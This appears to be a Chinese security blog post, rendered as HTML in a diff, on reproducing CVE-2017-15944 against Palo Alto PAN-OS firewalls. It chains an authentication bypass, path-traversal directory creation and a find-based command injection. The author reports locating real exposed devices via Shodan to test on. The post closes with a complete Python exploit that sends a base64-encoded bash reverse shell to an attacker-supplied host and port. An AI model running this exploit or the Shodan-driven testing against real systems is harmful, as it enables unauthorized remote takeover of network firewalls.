@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width">
+	<title>CVE-2017-15944 Palo Alto防火墙远程代码执行构造 EXP &ndash; # alert`D0n9` ｜ 输攻墨守</title>
+	<link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/nav.css">
+    
+    
+    
+    
+    
+	<link rel="stylesheet" href="/css/themes/light.css">
+</head>
+<body>
+	<input class="show-hide-menu-input" style="display:none;" autocomplete="off" type="checkbox" id="toggle-1">
+	<label class="overlay" for="toggle-1"></label>
+	<div class="main">
+		<header class="header">
+			<div class="header-content">
+				<div class="title">
+					<a href="http://localhost:1313/"># alert`D0n9` ｜ 输攻墨守</a>
+				</div>
+				<div>
+					<div class="header-right">
+						<label id="show-hide-menu-label" class="clickable-header-label" for="toggle-1">
+							<img class="color-adapting-image" width="30" src="/images/hamburger.svg" alt="menu button">
+						</label>
+					</div>
+					<div class="dont-show">
+						<p>
+							Links:
+						</p>
+					</div>
+					<ul class="links">
+						<li><a href="/">Home</a></li>
+						<li><a href="/posts/">Posts</a></li>
+						<li><a href="/about-me/">About Me</a></li>
+						<li><a href="/tags/">Tags</a></li>
+					</ul>
+				</div>
+			</div>
+		</header>
+		<main class="body">
+			<div class="body-content">
+  <header class="title-header">
+    <h1>CVE-2017-15944 Palo Alto防火墙远程代码执行构造 EXP</h1>
+    <div class="title-header-date">
+        <time>Friday, January 26, 2018</time>
+    </div>
+    
+  </header>
+  <blockquote>
+<p>在 exploit-db 看到 CVE-2017-15944 这个漏洞，三处漏洞打出的组合拳导致最后命令执行，三环缺一不可，最喜欢这样变废为宝的利用，但是在复现构造EXP还是遇到不少“坑”，本文记录一下填坑的过程&hellip;.</p>
+</blockquote>
+<p>exploit-db 地址 <a href="https://www.exploit-db.com/exploits/43342/">https://www.exploit-db.com/exploits/43342/</a></p>
+<p>该漏洞影响范围还是很广泛的，但是并没有看到有人放出EXP，最多只是PoC或者省去了很坑的命令执行漏洞。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;=PAN-OS 6.1.18
+</span></span><span class="line"><span class="cl">&lt;=PAN-OS 7.0.18
+</span></span><span class="line"><span class="cl">&lt;=PAN-OS 7.1.13
+</span></span><span class="line"><span class="cl">&lt;=PAN-OS 8.0.5
+</span></span></code></pre></div><p>三处漏洞分别为：权限绕过，任意目录创建，命令执行</p>
+<p>不过命令执行部分的详细内容原作者并没有给出，只有 Payload ，而且还执行不成功，手头也没有设备，只好硬着头皮去 Shodan 找到环境，一点点摸索尝试构造 EXP</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ shodan download search <span class="s1">&#39;Location: /php/login.php port:&#34;4443&#34;&#39;</span> limit <span class="m">3000</span>
+</span></span><span class="line"><span class="cl">$ shodan parse --fields ip_str search.json.gz
+</span></span></code></pre></div><p>原作者给出了权限绕过的 PoC</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; 10.0.0.1/php/utils/debug.php
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;&lt;title&gt;Moved Temporarily&lt;/title&gt;&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;&lt;h1&gt;Moved Temporarily&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;p&gt;The document has moved &lt;a href=&#34;http://10.0.0.1:28250/php/logout.php
+</span></span><span class="line"><span class="cl">&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span></span><span class="line"><span class="cl">&lt;address&gt;PanWeb Server/ -  at 127.0.0.1:28250 Port 80&lt;/address&gt;&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span><span class="line"><span class="cl">imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; &#39;
+</span></span><span class="line"><span class="cl">10.0.0.1/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27&#34;;user|s.&#34;1337&#34;;&#39;
+</span></span><span class="line"><span class="cl">@start@Success@end@
+</span></span><span class="line"><span class="cl">imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; 10.0.0.1/php/utils/debug.php
+</span></span><span class="line"><span class="cl">2&gt;/dev/null|head -30
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;
+</span></span><span class="line"><span class="cl">http://www.w3.org/TR/html4/loose.dtd&#34;;&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;/&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Debug Console&lt;/title&gt;
+</span></span></code></pre></div><p>这一步的漏洞详情描述最复杂，英文阅读能力跟不上看地也是云里雾里的&hellip;</p>
+<p>PoC 就很简单了，其实这个漏洞总结一句话就是可以设置任意 cookie 绕过页面的权限认证</p>
+<p>先访问 <strong>/php/utils/debug.php</strong> ，然而访问 <strong>/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27&quot;;user|s.&ldquo;1337&rdquo;;</strong> 再访问**/php/utils/debug.php**便绕过了认证</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171654725.jpg" alt=""></p>
+<p>任意目录创建使用前面设置的cookie POST JSON 请求到 <strong>/php/utils/router.php/Administrator.get</strong>，如果成功便会在**/opt/pancfg/session/pan/user_tmp/{cookie value}/{jobid}.xml** 创建一个目录和临时文件，目录就是下面Payload的cookie值，可以用../跳目录，jobid 是应该是创建的任务，在response中会返回。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;action&#34;:&#34;PanDirect&#34;,&#34;method&#34;:&#34;execute&#34;,&#34;data&#34;:
+</span></span><span class="line"><span class="cl">[&#34;07c5807d0d927dcd0980f86024e5208b&#34;,&#34;Administrator.get&#34;,
+</span></span><span class="line"><span class="cl">{&#34;changeMyPassword&#34;:true,&#34;template&#34;:&#34;asd&#34;,&#34;id&#34;:&#34;admin&#39;]\&#34;
+</span></span><span class="line"><span class="cl">async-mode=&#39;yes&#39; refresh=&#39;yes&#39;
+</span></span><span class="line"><span class="cl">cookie=&#39;../../../../../../tmp/hacked&#39;/&gt;\u0000&#34;}],&#34;type&#34;:&#34;rpc&#34;,&#34;tid&#34;:713}
+</span></span></code></pre></div><p>我在测试的时候遇到一个小问题，复制的payload 一直返回 ** {&ldquo;type&rdquo;:&ldquo;exception&rdquo;,&ldquo;tid&rdquo;:&quot;&quot;,&ldquo;message&rdquo;:&ldquo;Call to undefined class: &ldquo;} **，这就很尴尬了，因为我既没有设备也没有代码，只能确定这肯定是一个报错，但并不知道怎么解决。</p>
+<p>emmmm，检查之后发现一处“坑”</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171655367.jpg" alt=""></p>
+<p>标红线的位置应该要有空格的，但是由于是copy的原因，空格可能就被换行替代了</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171655712.jpg" alt=""></p>
+<p>如果看到这样的response返回那么就是成功了</p>
+<p>其实命令执行漏洞也要配合这里任意创建目录才能完成攻击，但是最关键的细节却被原隐藏了</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171655847.jpg" alt=""></p>
+<p>大概知道环境是crontab 执行脚本，两个脚本之间调用（genindex_batch.sh 调用 genindex.sh），<strong>$PAN_BASE_DIR/logdb/$dir/1</strong> 是出现漏洞的代码，大概是$dir可控，但是文中提到的find却不知道是何作用。</p>
+<p>不过好在原作者给出了EXP示例</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">* -print -exec python -c exec(&#34;[base64 code..]&#34;.decode(&#34;base64&#34;)) ;
+</span></span></code></pre></div><p>熟悉find命令的同学肯定知道 ** -print -exec ** 的作用，不熟悉也没有关系，可以man find进行查看，</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171655026.jpg" alt="">
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171656569.jpg" alt=""></p>
+<p>猜测genindex.sh脚本使用 find 并且目录可控，不过在这里犯了一个致命的错误，因为在命令构造的时候是在终端测试，所以要加单引号双引号不然会报错，前面说过Payload是JOSN，所以又要考虑引号转义的问题，这里抓头了一阵。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171656384.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171656575.jpg" alt=""></p>
+<p>意识到错误之后便在sh脚本中测试命令，因为这里是隐式的命令执行，所以要利用oob的方式进行验证，要注意命令并不会立即执行，因为存在命令执行的文件是genindex.sh，而且是 genindex_batch.sh 进行调用，genindex_batch.sh 又是crontab 每隔15分钟执行一次，所以到等触发时间，这里需要注意命令可能会被多次执行，拿到shell看到源码才知道原来命令执行的地方是一个for循环。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171656090.jpg" alt="">
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171657249.jpg" alt=""></p>
+<p>ok，可以尝试一下写webshell，直接执行echo肯定是不行的，特殊符号问题。</p>
+<p>所以要使用编码，原作者也是使用的这种方式，不过编码有一个特别不好的地方是长度会增加，因为这里是其实是创建文件夹，Linux文件名称最长可支持到255个字符(characters)</p>
+<p>漏洞发现者是写webshell拿到的权限，这样权限是nobody，属于低权限，想要root权限就用反弹shell</p>
+<p>下面给出 EXP</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># encoding: utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">step3_exp</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;exec(&#34;import os; os.system(&#39;bash -i &gt;&amp; /dev/tcp/</span><span class="si">{}</span><span class="s1">/</span><span class="si">{}</span><span class="s1"> 0&gt;&amp;1&#39;)&#34;)&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp_post</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;{&#34;action&#34;:&#34;PanDirect&#34;,&#34;method&#34;:&#34;execute&#34;,&#34;data&#34;:[&#34;07c5807d0d927dcd0980f86024e5208b&#34;,&#34;Administrator.get&#34;,{&#34;changeMyPassword&#34;:true,&#34;template&#34;:&#34;asd&#34;,&#34;id&#34;:&#34;admin&#39;]\&#34; async-mode=&#39;yes&#39; refresh=&#39;yes&#39;  cookie=&#39;../../../../../../../../../tmp/* -print -exec python -c exec(\&#34;&#39;&#39;&#39;</span><span class="o">+</span> <span class="n">command</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;\&#34;.decode(\&#34;base64\&#34;)) ;&#39;/&gt;\u0000&#34;}],&#34;type&#34;:&#34;rpc&#34;,&#34;tid&#34;: 713}&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">exp_post</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">step1_url</span> <span class="o">=</span> <span class="s1">&#39;https://</span><span class="si">{}</span><span class="s1">:</span><span class="si">{}</span><span class="s1">/php/utils/debug.php&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">step2_url</span> <span class="o">=</span> <span class="s1">&#39;https://</span><span class="si">{}</span><span class="s1">:</span><span class="si">{}</span><span class="s1">/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27&#34;;user|s.&#34;1337&#34;;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">step3_url</span> <span class="o">=</span> <span class="s1">&#39;https://</span><span class="si">{}</span><span class="s1">:</span><span class="si">{}</span><span class="s1">/php/utils/router.php/Administrator.get&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">step1_url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">step2_url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">step1_url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Debug Console&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="s1">&#39;[+] bypass success&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">lhost</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[*] LHOST: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">lhost</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s1">&#39;[+] set LHOST = </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">lhost</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">lport</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;[*] LPORT: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;[!] LHOST invalid&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">lport</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s1">&#39;[+] set LPORT = </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">lport</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;[!] LPORT invalid&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exp_post</span> <span class="o">=</span> <span class="n">step3_exp</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rce</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">step3_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">exp_post</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">][</span><span class="s1">&#39;@status&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;success&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s1">&#39;[+] success, please wait ... &#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s1">&#39;[+] jobID: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rce</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">][</span><span class="s1">&#39;result&#39;</span><span class="p">][</span><span class="s1">&#39;job&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;[!] fail&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;[!] bypass fail&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">err</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">err</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;[+] usage: python CVE_2017_15944_EXP.py IP PORT&#39;</span><span class="p">)</span>
+</span></span></code></pre></div>
+  
+  
+  <div class="post-tags">
+    <p>Tags: 
+    
+      <a href="/tags/cve">CVE</a>
+    
+      <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
+    
+      <a href="/tags/rce">RCE</a>
+    
+      <a href="/tags/web%E5%AE%89%E5%85%A8">Web安全</a>
+    
+      <a href="/tags/palo-alto">Palo Alto</a>
+    
+      <a href="/tags/firewall">Firewall</a>
+    
+    </p>
+  </div>
+  
+
+			</div>
+		</main>
+	</div>
+	<hr class="dont-show">
+	<footer class="footer">
+		<p>Powered by <a href="https://gohugo.io/">Hugo</a> &amp; <a href="https://github.com/stevenengler/no-js-hugo-theme">no-js-hugo-theme</a></p>
+	</footer>
+</body>
+</html>
